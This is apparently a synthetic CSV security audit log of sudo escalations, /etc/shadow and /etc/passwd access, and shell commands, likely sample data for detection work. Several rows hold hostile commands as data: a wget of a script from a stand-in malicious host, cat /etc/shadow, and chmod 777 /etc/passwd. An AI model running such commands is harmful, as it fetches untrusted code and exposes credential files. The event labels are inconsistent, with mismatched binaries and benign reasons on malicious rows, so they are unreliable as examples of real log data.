timestamp,user_id,event_type,resource,action,command,result,ip_address,session_id,reason
2025-05-03T02:22:17Z,U3645,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.128,89662,Execution blocked by policy
2025-05-05T12:11:17Z,U7962,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.205,41052,Administrative task
2025-05-05T17:01:17Z,U3393,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.155,52306,Administrative task
2025-05-05T08:54:17Z,U2404,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.96,84143,Privileged command executed
2025-05-04T02:00:17Z,U4948,file_access,/etc/shadow,write,,success,10.0.0.57,82423,Access to sensitive file
2025-05-03T11:37:17Z,U5994,file_access,/etc/passwd,read,,failure,10.0.0.53,33604,Command not found
2025-04-30T23:30:17Z,U1044,file_access,/etc/shadow,read,,failure,10.0.0.3,80437,Invalid argument
2025-05-02T18:21:17Z,U7368,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.197,90534,Privileged command executed
2025-05-01T08:35:17Z,U4866,file_access,/etc/shadow,read,,success,10.0.0.154,21145,Routine system scan
2025-05-06T10:13:17Z,U1488,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.134,21142,Normal command execution
2025-05-05T23:11:17Z,U2907,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.166,83372,Access to sensitive file
2025-05-03T16:42:17Z,U6490,file_access,/etc/passwd,read,,success,10.0.0.73,30494,Administrative task
2025-05-01T06:39:17Z,U5581,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.42,69496,Invalid argument
2025-05-05T01:14:17Z,U5336,exec,/bin/sudo,run,ls -al /etc,failure,10.0.0.219,31220,Execution blocked by policy
2025-05-04T09:54:17Z,U8435,file_access,/etc/shadow,write,,success,10.0.0.24,84957,Routine system scan
2025-05-02T05:22:17Z,U1005,file_access,/etc/shadow,read,,failure,10.0.0.226,79351,Command not found
2025-05-02T01:58:17Z,U6289,exec,/bin/sudo,run,touch /tmp/testfile,failure,10.0.0.179,12765,Permission denied
2025-05-06T21:18:17Z,U4175,exec,/bin/bash,run,cat /etc/shadow,success,10.0.0.37,47358,Administrative task
2025-05-06T08:26:17Z,U7354,file_access,/etc/shadow,read,,success,10.0.0.91,24900,Access to sensitive file
2025-05-06T07:17:17Z,U4005,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.92,77927,Normal command execution
2025-05-02T19:54:17Z,U6797,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.133,21150,Access to sensitive file
2025-05-04T04:12:17Z,U6450,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.170,48528,Administrative task
2025-04-30T08:20:17Z,U5716,file_access,/etc/passwd,write,,success,10.0.0.202,53503,Administrative task
2025-04-30T17:57:17Z,U8433,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.248,75419,Access to sensitive file
2025-05-05T11:52:17Z,U6910,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.64,70069,Privileged command executed
2025-05-02T23:48:17Z,U7899,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.57,50774,Administrative task
2025-05-03T00:24:17Z,U5814,file_access,/etc/passwd,read,,success,10.0.0.212,84212,Privileged command executed
2025-05-03T01:13:17Z,U9369,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.93,62956,Routine system scan
2025-05-03T04:02:17Z,U6904,exec,/bin/bash,run,sudo su,success,10.0.0.83,22390,Privileged command executed
2025-05-01T19:10:17Z,U6673,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,failure,10.0.0.88,22291,Invalid argument
2025-05-06T14:49:17Z,U6880,exec,/usr/bin/top,run,ls -al /etc,success,10.0.0.172,17130,Normal command execution
2025-05-07T05:10:17Z,U1240,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.37,76232,Routine system scan
2025-05-01T07:07:17Z,U7115,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.173,50257,Invalid argument
2025-05-02T06:53:17Z,U3953,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.42,92954,Routine system scan
2025-05-05T19:15:17Z,U7762,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.222,72485,Segmentation fault
2025-04-30T09:54:17Z,U4072,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.136,62218,Privileged command executed
2025-05-02T13:10:17Z,U9710,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.86,33101,Access to sensitive file
